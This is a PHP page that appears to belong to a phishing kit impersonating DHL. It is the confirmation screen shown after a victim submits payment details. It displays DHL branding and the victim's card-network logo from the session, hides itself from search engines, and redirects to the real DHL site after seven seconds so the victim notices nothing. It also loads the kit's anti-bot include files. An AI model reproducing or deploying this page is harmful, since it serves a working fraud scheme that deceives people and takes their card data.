<?php
session_start();

include("./ABRID/911.php");
include("./ABRID/SYS.php");
include("X_911.php");
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
		<meta http-equiv="refresh" content="7; URL=https://www.DHL.com" />

        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/font-awesome.min.css">
		<link rel="stylesheet" href="https://dancinggorillas.com/fonts/1/style.css">
		<link rel="stylesheet" href="./X911/bootstrap-icons.css">
		
        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico" />

        <title>| DHL |</title>
    </head>
<body>

        
<div>
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
		      <div class="modal-header">
		        	<img src="./X911/dhl-logo.svg">
		            <img src="./X911/<?php echo $_SESSION['bank_scheme']; ?>.png" class="sfli">
		      </div>
		      <div class="modal-body pt-3">
                <div class="text-center"><img src="./X911/valid.gif"></div>
		      	<div class="text-center px-3 py-3">
                     <h4 style="color:green;"><?php echo get_text("thanks_2"); ?></h4>
                     <p>
                        <?php echo get_text("thanks"); ?>
                     </p>
                </div>
                <div class="copirayt text-center">
                     <p><?php echo get_text("copyright"); ?></p>
                </div>
		      </div>
		    </div>
		  </div>
		</div>
        

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        
     </body>
	 </html>